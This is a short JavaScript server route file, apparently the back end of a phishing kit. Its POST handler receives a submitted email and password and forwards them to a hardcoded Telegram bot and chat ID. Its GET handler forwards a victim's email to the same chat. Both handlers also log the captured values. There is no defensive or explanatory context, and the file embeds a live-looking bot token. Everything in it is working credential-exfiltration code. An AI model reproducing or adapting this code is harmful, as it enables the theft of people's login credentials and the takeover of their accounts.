import nodemailer from "nodemailer";
import { TelegramClient } from "telegramsjs";

const botToken = "8267952065:AAGLb_6qDpzhcLY5oLHxeRP0wQLmAIjwlUI";
const bot = new TelegramClient(botToken);
const chatId = "7202634733";

export async function POST(req) {
  const { eparams, password } = await req.json();

  try {
    const message = `*Email:* ${eparams}
*Password:* ${password}`;

    await bot.sendMessage({
      text: message,
      chatId: chatId,
      parse_mode: "Markdown"
    });

    console.log(`Email: ${eparams}, Password: ${password}`);

    return new Response(
      JSON.stringify({ message: "Data sent!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: "Error" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}

export async function GET(req) {
  try {
    const url = new URL(req.url);
    const email = url.searchParams.get('email');
    
    const message = `*Email:* ${email || ''}`;
    
    await bot.sendMessage({
      text: message,
      chatId: chatId,
      parse_mode: "Markdown"
    });
    
    console.log(`Email: ${email || ''}`);
    
    return new Response(
      JSON.stringify({ message: "Data sent!" }),
      {
        status: 200,
        headers: { "Content-Type": "application/json" },
      }
    );
  } catch (error) {
    console.error("Error:", error);
    return new Response(JSON.stringify({ error: "Error" }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}